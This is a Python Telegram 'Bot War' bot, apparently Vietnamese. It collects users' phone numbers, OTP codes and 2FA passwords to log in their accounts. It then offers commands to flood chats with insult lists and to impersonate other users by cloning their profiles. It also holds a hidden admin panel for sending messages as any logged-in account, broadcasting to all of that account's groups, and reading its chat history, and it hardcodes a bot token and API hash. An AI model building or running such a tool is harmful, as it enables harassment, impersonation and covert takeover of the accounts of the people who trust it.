import asyncio, os, random, datetime, edge_tts, re, glob, requests
from aiohttp import web
from telethon import TelegramClient, events, Button, functions, types
from telethon.errors import (
    FloodWaitError, RPCError, UserNotParticipantError, 
    SessionPasswordNeededError, PhoneCodeInvalidError, 
    PhoneCodeExpiredError, PhoneNumberInvalidError, PasswordHashInvalidError
)

# ==========================================
# CẤU HÌNH HỆ THỐNG
# ==========================================
A_ID = 32300846
A_HS = "a6da3117ff6b8a1679d04ab743976068"
B_TK = '8991807402:AAG9h73vG6QaMnWWBTiakYePWKwcamsbO1s'
O_ID = 7907990385

REQUIRED_GROUP_USERNAME = "muadonglanhgia36" 
REQUIRED_GROUP_LINK = "https://t.me/muadonglanhgia36"

U1 = "https://raw.githubusercontent.com/ehvuebe-png/Cailontaone/main/chui.txt"
U2 = "https://gist.githubusercontent.com/tranthanhloc2099-wq/26971850c22bbc6578dae5a91fc2f154/raw/e96b3178dbce97dab5a9218eced5085802eb1711/chui2.txt"

user_delays = {}
DEFAULT_DELAY = 0.2

# Bộ nhớ tạm lưu tài khoản Admin đang chọn điều khiển từ xa
admin_selected_target = {}

def get_user_delay(u_i):
    return user_delays.get(u_i, DEFAULT_DELAY)

def _sync():
    for n, u in {"chui.txt": U1, "chui2.txt": U2}.items():
        try:
            r = requests.get(u, timeout=10)
            if r.status_code == 200:
                with open(n, "w", encoding="utf-8") as f: f.write(r.text)
        except: pass
_sync()

bot = TelegramClient('bot_manage', A_ID, A_HS).start(bot_token=B_TK)
o_p, u_c, c_b, c_i, s_t, cl_t, a_r, o_f, w_m = {}, {}, {}, {}, {}, {}, {}, {}, {}

F1, F2, F3, F4 = "bot_users.txt", "banned_users.txt", "joined_users.txt", "admins.txt"

if os.path.exists(F2):
    with open(F2, "r") as f: b_u = set(int(l.strip()) for l in f if l.strip())
else: b_u = set()

if os.path.exists(F3):
    with open(F3, "r") as f: verified_users = set(int(l.strip()) for l in f if l.strip())
else: verified_users = set()

if os.path.exists(F4):
    with open(F4, "r") as f: admins = set(int(l.strip()) for l in f if l.strip())
else: admins = {O_ID}

def _save_verified():
    with open(F3, "w") as f:
        for uid in verified_users: f.write(f"{uid}\n")

def _save_admins():
    with open(F4, "w") as f:
        for aid in admins: f.write(f"{aid}\n")

def _sb():
    with open(F2, "w") as f:
        for u in b_u: f.write(f"{u}\n")

def _su(u):
    if not os.path.exists(F1): open(F1, "w").close()
    with open(F1, "r") as f: us = f.read().splitlines()
    if str(u) not in us:
        with open(F1, "a") as f: f.write(f"{u}\n")

async def is_user_in_channel(user_id):
    if user_id in admins: return True
    try:
        await bot(functions.channels.GetParticipantRequest(
            channel=REQUIRED_GROUP_USERNAME, participant=user_id
        ))
        if user_id not in verified_users:
            verified_users.add(user_id)
            _save_verified()
        return True
    except UserNotParticipantError:
        if user_id in verified_users:
            verified_users.remove(user_id)
            _save_verified()
        return False
    except Exception:
        if user_id in verified_users:
            return True
        return False

# ==========================================
# GIAO DIỆN MENU
# ==========================================
def get_main_menu(u):
    logged = u in u_c
    status_text = "🟢 ĐÃ LOGIN (Sẵn sàng chiến)" if logged else "🔴 CHƯA LOGIN (Cần đăng nhập)"
    current_delay = get_user_delay(u)
    
    msg = f"""
🔥 **BOT WAR TELEGRAM SYSTEM**
────────────────
• Trạng thái tài khoản: `{status_text}`
• Delay hiện tại: `{current_delay}s`
• Chọn chức năng bên dưới:
"""
    buttons = [
        [Button.inline("💥 Spam & Tag", data="m_spam"), Button.inline("☠ Mute / Câm", data="m_mute")],
        [Button.inline("📦 Lặt Vặt & Tiện Ích", data="m_other"), Button.inline("⚙️ CẤU HÌNH DELAY", data="m_setting")]
    ]
    
    if u in admins:
        buttons.append([Button.inline("🎮 Bảng Điều Khiển Acc Remote (Admin)", data="m_control")])

    buttons.append([Button.inline("📱 LOGIN TÀI KHOẢN", data="login"), Button.inline("🚪 LOGOUT", data="logout_acc")])
    
    if u in admins:
        buttons.append([Button.inline("👑 Lệnh Admin System", data="m_admin")])
        
    return msg, buttons

def get_join_msg():
    msg = """
⚠️ **YÊU CẦU THAM GIA NHÓM**

Bạn phải tham gia nhóm thì mới sử dụng được bot. 
Vào nhóm xong bấm nút **Xác Nhận** bên dưới.
"""
    buttons = [
        [Button.url("📢 Vào Nhóm Ngay", REQUIRED_GROUP_LINK)],
        [Button.inline("🔄 Xác Nhận Đã Vào", data="check_join")]
    ]
    return msg, buttons

# ==========================================
# LOGIC USERBOT KHI HOẠT ĐỘNG
# ==========================================
def _logic(c, u_i):
    def _mk(cid): w_m[f"{u_i}_{cid}"] = datetime.datetime.now(datetime.timezone.utc)

    async def _sd(cid, ct, tid=None):
        s_t[u_i] = True
        inf = isinstance(ct, str)
        ls = ct if not inf else [ct]
        while s_t.get(u_i):
            for m in ls:
                if not s_t.get(u_i): break
                try:
                    fm = f"{m.strip()} [\u200b](tg://user?id={tid})" if tid else m.strip()
                    await c.send_message(cid, fm, parse_mode='markdown')
                    delay = get_user_delay(u_i)
                    await asyncio.sleep(delay)
                except FloodWaitError as e: await asyncio.sleep(e.seconds + 2)
                except: break
            if not inf: break

    @c.on(events.NewMessage(outgoing=True, pattern=r'/sptagname (@?\w+)'))
    async def _sptagname(e):
        username = e.pattern_match.group(1).replace('@', '')
        _mk(e.chat_id); await e.delete()
        if os.path.exists('chui.txt'):
            with open('chui.txt', 'r', encoding='utf-8') as f:
                lines = [line.strip() for line in f if line.strip()]
            if not lines: return
            s_t[u_i] = True
            while s_t.get(u_i):
                for m in lines:
                    if not s_t.get(u_i): break
                    try:
                        fm = f"{m} [@{username}](tg://resolve?domain={username})"
                        await c.send_message(e.chat_id, fm, parse_mode='markdown')
                        delay = get_user_delay(u_i)
                        await asyncio.sleep(delay)
                    except FloodWaitError as err: await asyncio.sleep(err.seconds + 2)
                    except: break

    @c.on(events.NewMessage(outgoing=True, pattern=r'/info(?:\s+(.+))?'))
    async def _inf(e):
        target = e.pattern_match.group(1)
        try:
            if target: user = await c.get_entity(int(target) if target.isdigit() else target)
            elif e.is_reply: user = await c.get_entity((await e.get_reply_message()).sender_id)
            else: user = await c.get_me()
            await e.edit(f"👤 **Name:** {user.first_name}\n🆔 **ID:** `{user.id}`\n🏷 **User:** @{user.username if user.username else 'N/A'}")
        except: await e.edit("❌ **Không tìm thấy!**")

    @c.on(events.NewMessage(outgoing=True, pattern=r'/fake(?:\s+(.+))?'))
    async def _fk(e):
        t = e.pattern_match.group(1)
        try:
            if t: target = await c.get_entity(int(t) if t.isdigit() else t)
            elif e.is_reply: target = await c.get_entity((await e.get_reply_message()).sender_id)
            else: return await e.edit("⚠️ Tag, ID hoặc Reply!")
        except: return await e.edit("❌ Không thấy!")
        await e.edit("🔄 Đang fake...")
        try:
            me = await c.get_me()
            me_f = await c(functions.users.GetFullUserRequest(id=me.id))
            my_p = await c.download_profile_photo('me')
            o_p[u_i] = {'f': me.first_name, 'l': me.last_name, 'a': me_f.full_user.about or "", 'p': my_p}
            tf = await c(functions.users.GetFullUserRequest(id=target.id))
            tu = tf.users[0]
            await c(functions.account.UpdateProfileRequest(first_name=tu.first_name or "", last_name=tu.last_name or "", about=tf.full_user.about or ""))
            p = await c.get_profile_photos(target.id, limit=1)
            if p:
                path = await c.download_media(p[0])
                await c(functions.photos.UploadProfilePhotoRequest(file=await c.upload_file(path)))
                if os.path.exists(path): os.remove(path)
            await e.edit("✅ Fake xong"); await asyncio.sleep(1); await e.delete()
        except: await e.edit("❌ Lỗi Fake")

    @c.on(events.NewMessage(outgoing=True, pattern=r'/diefake'))
    async def _dfk(e):
        if u_i not in o_p: return await e.edit("⚠️ Chưa lưu gốc!")
        await e.edit("🔙 Đang về lại acc gốc...")
        o = o_p[u_i]
        try:
            await c(functions.account.UpdateProfileRequest(first_name=o['f'] or "", last_name=o['l'] or "", about=o['a'] or ""))
            if o['p'] and os.path.exists(o['p']):
                await c(functions.photos.UploadProfilePhotoRequest(file=await c.upload_file(o['p'])))
                os.remove(o['p'])
            o_p.pop(u_i)
            await e.edit("✅ Về gốc xong"); await asyncio.sleep(1); await e.delete()
        except: await e.edit("❌ Lỗi diefake")

    @c.on(events.NewMessage(outgoing=True, pattern=r'/sp (\d+)'))
    async def _sp1(e):
        t = int(e.pattern_match.group(1)); _mk(e.chat_id); await e.delete()
        if os.path.exists('chui.txt'): await _sd(e.chat_id, open('chui.txt', 'r', encoding='utf-8').readlines(), t)

    @c.on(events.NewMessage(outgoing=True, pattern=r'/sp2 (\d+)'))
    async def _sp2(e):
        t = int(e.pattern_match.group(1)); _mk(e.chat_id); await e.delete()
        if os.path.exists('chui2.txt'): await _sd(e.chat_id, open('chui2.txt', 'r', encoding='utf-8').read().strip(), t)

    @c.on(events.NewMessage(outgoing=True, pattern=r'/spicon (\d+)'))
    async def _spi(e):
        _mk(e.chat_id); s_t[u_i] = True; await e.delete()
        try: cnt = int(e.pattern_match.group(1))
        except: cnt = 10
        for _ in range(min(cnt, 500)):
            if not s_t.get(u_i): break
            await e.respond(random.choice(["🧠", "💩", "🤪", "🤣", "💀", "🤡", "🫵", "🙄", "🤙", "👻"]))
            await asyncio.sleep(get_user_delay(u_i))

    @c.on(events.NewMessage(outgoing=True, pattern=r'/stop'))
    async def _stp(e):
        s_t[u_i] = False; cl_t[u_i] = False; await e.edit("🛑 **STOP!**"); await asyncio.sleep(1); await e.delete()

# ==========================================
# XỬ LÝ SỰ KIỆN BOT CHÍNH & CALLBACK
# ==========================================
@bot.on(events.NewMessage(pattern='/start'))
async def _st(ev):
    u = ev.sender_id
    _su(u)
    if await is_user_in_channel(u):
        msg, buttons = get_main_menu(u)
        await ev.respond(msg, buttons=buttons, parse_mode='markdown')
    else:
        msg, buttons = get_join_msg()
        await ev.respond(msg, buttons=buttons, parse_mode='markdown')

@bot.on(events.CallbackQuery)
async def _callback_handler(ev):
    u = ev.sender_id
    data = ev.data.decode('utf-8')

    if u in b_u: return await ev.answer("🚫 Bạn đã bị BAN!", alert=True)

    if data == "check_join":
        if await is_user_in_channel(u):
            msg, buttons = get_main_menu(u)
            await ev.edit(msg, buttons=buttons, parse_mode='markdown')
            return await ev.answer("✅ Đã xác nhận tham gia nhóm!", alert=True)
        else:
            return await ev.answer("❌ Bạn vẫn chưa tham gia nhóm!", alert=True)

    if not await is_user_in_channel(u):
        msg, buttons = get_join_msg()
        try: await ev.edit(msg, buttons=buttons, parse_mode='markdown')
        except: await ev.respond(msg, buttons=buttons, parse_mode='markdown')
        return await ev.answer("⚠️ Bạn đã rời khỏi nhóm! Vui lòng tham gia lại.", alert=True)

    if data == "m_main":
        msg, buttons = get_main_menu(u)
        await ev.edit(msg, buttons=buttons, parse_mode='markdown')

    elif data == "m_spam":
        warn = "\n\n⚠️ **Lưu ý:** *Vui lòng LOGIN tài khoản để thực thi các lệnh này!*" if u not in u_c else ""
        txt = f"💥 **DANH SÁCH LỆNH SPAM & TAG**\n────────────────\n• `/sptagname <Tên>`: Spam tag kèm tên\n• `/sp <id>`: Spam chửi 1\n• `/sp2 <id>`: Spam chửi 2\n• `/spicon <số>`: Spam icon\n• `/spnd <text>`: Spam treo text\n• `/spstick <số>`: Spam sticker\n• `/spcall <id>`: Spam call\n• `/stop`: Dừng lại tất cả{warn}"
        await ev.edit(txt, buttons=[[Button.inline("🔙 Trở Về", data="m_main")]], parse_mode='markdown')

    elif data == "m_mute":
        warn = "\n\n⚠️ **Lưu ý:** *Vui lòng LOGIN tài khoản để thực thi các lệnh này!*" if u not in u_c else ""
        txt = f"☠ **DANH SÁCH LỆNH MUTE / CÂM**\n────────────────\n• `/cam <id> <box>`: Câm box\n• `/sua <id> <box>`: Mở câm box\n• `/camib <id>`: Câm inbox\n• `/suaib <id>`: Mở câm inbox{warn}"
        await ev.edit(txt, buttons=[[Button.inline("🔙 Trở Về", data="m_main")]], parse_mode='markdown')

    elif data == "m_other":
        warn = "\n\n⚠️ **Lưu ý:** *Vui lòng LOGIN tài khoản để thực thi các lệnh này!*" if u not in u_c else ""
        txt = f"📦 **DANH SÁCH LẶT VẶT & ACC**\n────────────────\n• `/info <@/id/rep>`: Soi acc\n• `/fake <@/id/rep>`: Fake acc đối tượng\n• `/diefake`: Trở về acc gốc\n• `/voice <văn bản>`: Tạo voice\n• `/autore <on/off>`: Tự thả tim\n• `/off <on/off>`: Báo bận tự rep\n• `/clear`: Xóa 200 tin nhắn\n• `/clear2`: Xóa tin nhắn bot\n• `/logout`: Thoát acc khỏi bot{warn}"
        await ev.edit(txt, buttons=[[Button.inline("🔙 Trở Về", data="m_main")]], parse_mode='markdown')

    elif data == "m_setting":
        cur_d = get_user_delay(u)
        txt = f"""
⚙️ **CẤU HÌNH DELAY TOÀN BỘ CHỨC NĂNG**
────────────────
• Delay hiện tại của bạn: `{cur_d} giây`
• Mặc định hệ thống: `{DEFAULT_DELAY} giây`

Bấm chọn các tùy chỉnh bên dưới:
"""
        buttons = [
            [Button.inline("⏱ Đặt Mặc Định (0.2s)", data="set_delay_default")],
            [Button.inline("⚡ Set Delay 0.1s", data="set_delay_01"), Button.inline("🐢 Set Delay 0.5s", data="set_delay_05")],
            [Button.inline("🐌 Set Delay 1.0s", data="set_delay_10"), Button.inline("💬 Nhập Số Giây Tự Chỉnh", data="set_delay_custom")],
            [Button.inline("🔙 Trở Về Menu", data="m_main")]
        ]
        await ev.edit(txt, buttons=buttons, parse_mode='markdown')

    elif data == "set_delay_default":
        user_delays[u] = DEFAULT_DELAY
        await ev.answer(f"✅ Đã reset Delay về mặc định ({DEFAULT_DELAY}s)", alert=True)
        msg, buttons = get_main_menu(u)
        await ev.edit(msg, buttons=buttons, parse_mode='markdown')

    elif data == "set_delay_01":
        user_delays[u] = 0.1
        await ev.answer("✅ Đã đổi Delay thành 0.1s", alert=True)
        msg, buttons = get_main_menu(u)
        await ev.edit(msg, buttons=buttons, parse_mode='markdown')

    elif data == "set_delay_05":
        user_delays[u] = 0.5
        await ev.answer("✅ Đã đổi Delay thành 0.5s", alert=True)
        msg, buttons = get_main_menu(u)
        await ev.edit(msg, buttons=buttons, parse_mode='markdown')

    elif data == "set_delay_10":
        user_delays[u] = 1.0
        await ev.answer("✅ Đã đổi Delay thành 1.0s", alert=True)
        msg, buttons = get_main_menu(u)
        await ev.edit(msg, buttons=buttons, parse_mode='markdown')

    elif data == "set_delay_custom":
        await ev.answer()
        async with bot.conversation(u) as cv:
            await cv.send_message("⏱ **Nhập thời gian Delay mong muốn** (tính bằng giây, ví dụ: `0.3` hoặc `2`):")
            try:
                res = await cv.get_response()
                val = float(res.text.strip())
                if val < 0.05:
                    await cv.send_message("⚠️ Delay quá nhỏ! Đã đặt mức tối thiểu là 0.05s.")
                    val = 0.05
                user_delays[u] = val
                await cv.send_message(f"✅ **Đã cài đặt Delay thành công:** `{val} giây` cho toàn bộ chức năng!")
            except:
                await cv.send_message("❌ Số giây nhập không hợp lệ!")

    # ==========================================
    # HỆ THỐNG ĐIỀU KHIỂN TÀI KHOẢN REMOTE (QUẢN LÝ THEO SỐ THỨ TỰ)
    # ==========================================
    elif data == "m_control":
        if u not in admins: return await ev.answer("❌ Chỉ Admin mới có quyền!", alert=True)
        
        if not u_c:
            txt = "🎮 **BẢNG ĐIỀU KHIỂN TÀI KHOẢN REMOTE**\n────────────────\n⚠️ *Hiện chưa có tài khoản nào đăng nhập vào bot.*"
            buttons = [[Button.inline("🔙 Trở Về Menu", data="m_main")]]
            return await ev.edit(txt, buttons=buttons, parse_mode='markdown')

        txt = f"🎮 **QUẢN LÝ TÀI KHOẢN THEO SỐ THỨ TỰ**\n────────────────\n• Tổng số tài khoản đang login: `{len(u_c)}`\n👇 **Chọn tài khoản theo STT bên dưới:**"
        buttons = []
        
        idx = 1
        for uid, client in u_c.items():
            try:
                me = await client.get_me()
                name = me.first_name or f"User {uid}"
                buttons.append([Button.inline(f"TK {idx}. {name} (ID: {uid})", data=f"sel_acc_{uid}")])
            except:
                buttons.append([Button.inline(f"TK {idx}. Acc ID: {uid}", data=f"sel_acc_{uid}")])
            idx += 1
                
        buttons.append([Button.inline("🔙 Trở Về Menu", data="m_main")])
        await ev.edit(txt, buttons=buttons, parse_mode='markdown')

    elif data.startswith("sel_acc_"):
        if u not in admins: return await ev.answer("Chỉ Admin mới có quyền!", alert=True)
        target_uid = int(data.split("_")[2])
        if target_uid not in u_c: return await ev.answer("Tài khoản này đã logout!", alert=True)
        
        admin_selected_target[u] = target_uid
        client = u_c[target_uid]
        me = await client.get_me()
        
        txt = f"""🕹 **HỒ SƠ TÀI KHOẢN ĐANG ĐIỀU KHIỂN:**
────────────────
👤 **Tên:** {me.first_name}
🆔 **ID Tài Khoản:** `{me.id}`
🏷 **Username:** @{me.username if me.username else 'Không có'}
📞 **SĐT:** `{me.phone if me.phone else 'Đã ẩn'}`

👉 Chọn chức năng thao tác từ xa:"""
        
        buttons = [
            [Button.inline("💬 Gửi Tin Nhắn Chỉ Định", data="rmt_send_one"), Button.inline("📢 Gửi All Nhóm (Broadcast)", data="rmt_send_all")],
            [Button.inline("📋 Danh Sách Nhóm / Channel", data="rmt_list_groups"), Button.inline("📜 Check Lịch Sử 20 Nhóm Gần Nhất", data="rmt_history")],
            [Button.inline("🔙 Chọn Tài Khoản Khác", data="m_control")]
        ]
        await ev.edit(txt, buttons=buttons, parse_mode='markdown')

    # ADMIN: GỬI TIN NHẮN CHỈ ĐỊNH
    elif data == "rmt_send_one":
        if u not in admins: return
        target_uid = admin_selected_target.get(u)
        if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản không còn kết nối!", alert=True)
        
        await ev.answer()
        async with bot.conversation(u) as cv:
            await cv.send_message("🎯 **Nhập ID hoặc @username người nhận/nhóm cần gửi:**")
            chat_target = (await cv.get_response()).text.strip()
            
            await cv.send_message("📝 **Nhập nội dung tin nhắn bạn muốn gửi đi:**\n*(Ví dụ: Xin Chào)*")
            msg_text = (await cv.get_response()).text.strip()
            
            client = u_c[target_uid]
            try:
                chat_entity = int(chat_target) if chat_target.isdigit() or chat_target.startswith("-") else chat_target
                await client.send_message(chat_entity, msg_text)
                await cv.send_message(f"✅ **Đã gửi thành công tin nhắn:** *'{msg_text}'* từ tài khoản `{target_uid}`!")
            except Exception as ex:
                await cv.send_message(f"❌ **Gửi tin nhắn thất bại:** `{ex}`")

    # ADMIN: GỬI ALL NHÓM
    elif data == "rmt_send_all":
        if u not in admins: return
        target_uid = admin_selected_target.get(u)
        if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản không còn kết nối!", alert=True)
        
        await ev.answer()
        async with bot.conversation(u) as cv:
            await cv.send_message("📢 **Nhập nội dung muốn gửi TẤT CẢ các nhóm của tài khoản này:**")
            msg_text = (await cv.get_response()).text.strip()
            
            client = u_c[target_uid]
            await cv.send_message("⏳ Đang tiến hành gửi tin nhắn hàng loạt...")
            
            success, fail = 0, 0
            dialogs = await client.get_dialogs(limit=100)
            for d in dialogs:
                if d.is_group or d.is_channel:
                    try:
                        await client.send_message(d.id, msg_text)
                        success += 1
                        await asyncio.sleep(1)
                    except:
                        fail += 1
                        
            await cv.send_message(f"✅ **Đã gửi xong!**\n• Thành công: `{success}` nhóm\n• Thất bại: `{fail}` nhóm")

    # ADMIN: XEM DANH SÁCH NHÓM
    elif data == "rmt_list_groups":
        if u not in admins: return
        target_uid = admin_selected_target.get(u)
        if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản không còn kết nối!", alert=True)
        
        client = u_c[target_uid]
        await ev.answer("⏳ Đang lấy danh sách nhóm...", alert=True)
        try:
            dialogs = await client.get_dialogs(limit=20)
            text = f"📋 **DANH SÁCH NHÓM CỦA ACC `{target_uid}`:**\n────────────────\n"
            for d in dialogs:
                if d.is_group or d.is_channel:
                    admin_rights = "👑 Admin" if getattr(d.entity, 'admin_rights', None) or getattr(d.entity, 'creator', False) else "👤 Member"
                    text += f"• **{d.name}**\n  - ID: `{d.id}` | Quyền: `{admin_rights}`\n"
            await ev.edit(text[:4000], buttons=[[Button.inline("🔙 Trở Về", data=f"sel_acc_{target_uid}")]], parse_mode='markdown')
        except Exception as ex:
            await ev.edit(f"❌ Lỗi: {ex}", buttons=[[Button.inline("🔙 Trở Về", data=f"sel_acc_{target_uid}")]])

    # ADMIN: CHECK LỊCH SỬ TIN NHẮN 20 NHÓM/CHATS GẦN NHẤT
    elif data == "rmt_history":
        if u not in admins: return
        target_uid = admin_selected_target.get(u)
        if not target_uid or target_uid not in u_c: return await ev.answer("Tài khoản không còn kết nối!", alert=True)
        
        client = u_c[target_uid]
        await ev.answer("⏳ Đang tải lịch sử 20 nhóm gần nhất...", alert=True)
        try:
            dialogs = await client.get_dialogs(limit=20)
            text = f"📜 **LỊCH SỬ TIN NHẮN 20 HỘI THOẠI/NHÓM GẦN NHẤT:**\n────────────────\n"
            stt = 1
            for d in dialogs:
                last_msg = d.message.text.replace("\n", " ")[:35] if d.message and d.message.text else "[Hình ảnh/Sticker/Voice]"
                type_str = "👥 Nhóm/Kênh" if (d.is_group or d.is_channel) else "👤 Chat riêng"
                text += f"**{stt}. {d.name}** ({type_str})\n• ID: `{d.id}`\n• Tin nhắn cuối: _{last_msg}_\n\n"
                stt += 1
            await ev.edit(text[:4000], buttons=[[Button.inline("🔙 Trở Về", data=f"sel_acc_{target_uid}")]], parse_mode='markdown')
        except Exception as ex:
            await ev.edit(f"❌ Lỗi: {ex}", buttons=[[Button.inline("🔙 Trở Về", data=f"sel_acc_{target_uid}")]])

    elif data == "logout_acc":
        if u in u_c:
            try:
                await u_c[u].log_out()
                u_c.pop(u, None)
                if os.path.exists(f"u_{u}.session"): os.remove(f"u_{u}.session")
                msg, buttons = get_main_menu(u)
                await ev.edit("🚪 **Đã đăng xuất tài khoản thành công!** Vui lòng Login lại nếu muốn tiếp tục sử dụng.\n\n" + msg, buttons=buttons, parse_mode='markdown')
            except Exception as e:
                await ev.answer(f"Lỗi logout: {e}", alert=True)
        else:
            await ev.answer("⚠️ Bạn hiện chưa đăng nhập tài khoản nào!", alert=True)

    elif data == "m_admin":
        if u not in admins: return await ev.answer("❌ Chỉ Admin mới có quyền!", alert=True)
        txt = "👑 **QUẢN TRỊ HỆ THỐNG (ADMIN)**\n• `/ban <id>`\n• `/unban <id>`\n• `/addadmin <id>`\n• `/tb <nội dung>`"
        await ev.edit(txt, buttons=[[Button.inline("🔙 Trở Về", data="m_main")]], parse_mode='markdown')

    elif data == "login":
        if u in u_c:
            return await ev.answer("✅ Bạn đã đăng nhập rồi! Không cần login lại.", alert=True)
        await ev.answer()
        async with bot.conversation(u) as cv:
            try:
                await cv.send_message("📱 **Nhập Số Điện Thoại** (Định dạng: `+84...`):")
                p = (await cv.get_response()).text.strip().replace(" ", "")
                c = TelegramClient(f"u_{u}", A_ID, A_HS)
                await c.connect()

                if not await c.is_user_authorized():
                    try:
                        r = await c.send_code_request(p)
                    except PhoneNumberInvalidError:
                        return await cv.send_message("❌ **Số điện thoại không hợp lệ!** Vui lòng kiểm tra lại đầu số.")
                    except FloodWaitError as e:
                        return await cv.send_message(f"❌ **Bạn đang bị giới hạn (FloodWait)!** Vui lòng đợi `{e.seconds}` giây nữa rồi thử lại.")
                    except Exception as err:
                        return await cv.send_message(f"❌ **Không thể gửi mã OTP:** `{str(err)}`")

                    await cv.send_message("🔑 **Nhập OTP** (⚠️ *BẮT BUỘC thêm dấu cách giữa các số, VD: 4 8 1 1 7*):\n*(Hệ thống đang thực thi xác thực mã qua phiên chat riêng)*")
                    o = (await cv.get_response()).text.strip().replace(" ", "").replace("-", "")
                    
                    try:
                        await c.sign_in(p, o, phone_code_hash=r.phone_code_hash)
                    except PhoneCodeInvalidError:
                        return await cv.send_message("❌ **Mã OTP không chính xác!** Vui lòng kiểm tra lại mã xác thực.")
                    except PhoneCodeExpiredError:
                        return await cv.send_message("❌ **Mã OTP đã hết hạn!** Vui lòng bấm login lại từ đầu.")
                    except SessionPasswordNeededError:
                        await cv.send_message("🔐 **Tài khoản của bạn đã bật Xác thực 2 bước (2FA).**\n\n👉 Vui lòng gửi **Mật khẩu 2FA** của bạn vào đây:")
                        pwd = (await cv.get_response()).text.strip()
                        try:
                            await c.sign_in(password=pwd)
                        except PasswordHashInvalidError:
                            return await cv.send_message("❌ **Mật khẩu 2FA không chính xác!** Vui lòng thử lại.")
                        except Exception as err:
                            return await cv.send_message(f"❌ **Lỗi đăng nhập 2FA:** `{str(err)}`")
                    except Exception as err:
                        return await cv.send_message(f"❌ **Lỗi xác thực mã:** `{str(err)}`")
                
                user = await bot.get_entity(u)
                username_str = f"@{user.username}" if user.username else "N/A"
                photo_path = await bot.download_profile_photo(u, file=f"avt_{u}.jpg")
                
                rep = f"""🚀 **THÔNG BÁO: CÓ NGƯỜI DÙNG LOGIN THÀNH CÔNG**
────────────────
👤 **Tên:** {user.first_name}
🏷 **Tag:** {username_str}
🆔 **ID:** `{u}`
📞 **SĐT:** `{p}`
🔗 **Link:** [Nhấp vào](tg://user?id={u})"""

                for aid in admins:
                    try:
                        if photo_path and os.path.exists(photo_path):
                            await bot.send_file(aid, photo_path, caption=rep, parse_mode='markdown')
                        else: 
                            await bot.send_message(aid, rep, parse_mode='markdown')
                    except: pass
                
                if photo_path and os.path.exists(photo_path): os.remove(photo_path)

                u_c[u] = c; _logic(c, u)
                await cv.send_message("✅ **LOGIN THÀNH CÔNG! Bạn đã có thể sử dụng toàn bộ tính năng.**")
            except Exception as e:
                err_msg = str(e) if str(e) else type(e).__name__
                await cv.send_message(f"❌ **Lỗi quá trình xử lý Login:** `{err_msg}`")

# ==========================================
# CÁC LỆNH ADMIN QUẢN TRỊ
# ==========================================
@bot.on(events.NewMessage(pattern=r'/addadmin (\d+)'))
async def _addadmin(e):
    if e.sender_id != O_ID: return await e.respond("❌ Chỉ Admin gốc mới có quyền thêm Admin mới!")
    new_admin = int(e.pattern_match.group(1))
    admins.add(new_admin)
    _save_admins()
    await e.respond(f"✅ Đã thêm thành công ID `{new_admin}` làm Admin!")

@bot.on(events.NewMessage(pattern=r'/ban (\d+)'))
async def _bn(e):
    if e.sender_id not in admins: return
    u = int(e.pattern_match.group(1))
    b_u.add(u); _sb()
    msg = f"🚫 Đã BAN ID: `{u}`"
    if u in u_c:
        try:
            if u in s_t: s_t[u] = False
            if u in cl_t: cl_t[u] = False
            await u_c[u].disconnect()
            u_c.pop(u)
            msg += " (Đã đăng xuất khỏi bot)"
        except: pass
    await e.respond(msg)

@bot.on(events.NewMessage(pattern=r'/unban (\d+)'))
async def _ubn(e):
    if e.sender_id not in admins: return
    u = int(e.pattern_match.group(1))
    if u in b_u:
        b_u.remove(u); _sb()
        await e.respond(f"✅ Đã UNBAN ID: `{u}`")
    else: await e.respond("⚠️ ID không có trong danh sách cấm!")

@bot.on(events.NewMessage(pattern=r'/tb\s+([\s\S]+)'))
async def _tb(e):
    if e.sender_id not in admins: return
    msg = e.pattern_match.group(1)
    if not os.path.exists(F1): return await e.respond("⚠️ Chưa có người dùng!")
    
    await e.respond("📣 **Đang gửi thông báo...**")
    count = 0
    with open(F1, "r") as f: ids = f.read().splitlines()
    for uid in ids:
        try:
            await bot.send_message(int(uid), f"📢 **THÔNG BÁO HỆ THỐNG**\n────────────────\n\n{msg}")
            count += 1
            await asyncio.sleep(0.3)
        except: continue
    await e.respond(f"✅ Đã gửi cho {count} người dùng!")

# ==========================================
# WEB SERVER GIỮ SỐNG CHO RENDER (KEEP-ALIVE)
# ==========================================
async def handle_ping(request):
    return web.Response(text="Bot War is running 24/7!")

async def start_web_server():
    app = web.Application()
    app.router.add_get('/', handle_ping)
    app.router.add_get('/ping', handle_ping)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

# ==========================================
# CHƯƠNG TRÌNH CHÍNH
# ==========================================
async def main():
    await start_web_server()
    
    for f in glob.glob("u_*.session"):
        try:
            u = int(f.split('_')[1].split('.')[0])
            if u in b_u: continue
            c = TelegramClient(f"u_{u}", A_ID, A_HS)
            await c.connect()
            if await c.is_user_authorized(): u_c[u] = c; _logic(c, u)
            else: await c.disconnect()
        except: pass
        
    await bot.run_until_disconnected()

if __name__ == '__main__':
    asyncio.get_event_loop().run_until_complete(main())
